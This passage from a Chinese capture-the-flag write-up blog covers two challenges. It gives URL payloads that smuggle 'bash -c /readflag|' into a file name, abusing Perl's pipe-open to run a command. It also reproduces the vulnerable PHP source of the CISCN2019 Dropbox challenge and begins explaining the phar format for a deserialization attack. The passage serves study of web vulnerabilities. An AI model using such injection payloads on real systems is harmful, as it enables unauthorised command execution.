language-none"><code class="language-none">?url&#x3D;&#x2F;&amp;filename&#x3D;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到了readflag文件，应该是要在根目录执行这个文件拿到flag了</p><blockquote><p>主要的知识点：perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠|）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</p></blockquote><p>看payload</p><pre class="line-numbers language-none"><code class="language-none">payload1:&#x2F;?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|这一步是先将bash -c &#x2F;readflag|写入名为bash -c &#x2F;readflag|的文件里payload2:&#x2F;?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;aaa这一步是要执行上一步中写入的命令并把结果放入aaa文件中payload3:&#x2F;sandbox&#x2F;230317844a87b41e353b096d0d6a5145&#x2F;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"   >          <a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2>      <p>注册-&gt;登录-&gt;上传文件-&gt;尝试下载-&gt;发现任意文件读取漏洞，查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//download.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename="</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>//class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将一个func放入funcs</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//files为一个数组，存放new出的对象并进行遍历</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//results是一个二维数组，[文件名][方法]=方法执行结果</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该是反序列化了，提示了phar协议，正好学习一下</p>        <h4 id="phar简介"   >          <a href="#phar简介" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar简介" class="headerlink" title="phar简介"></a>phar简介</h4>      <p>phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。可以将phar文件类比为一个压缩文件</p><pre class="line-numbers language-none"><code class="language-none">phar文件结构1. a stub可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。2. a manifest describing the contentsphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。3. the file contents被压缩文件的内容。4. [optional] a signature for verifying Phar integrity (phar file format only)签名，放在文件末尾<span aria-hidden="true" 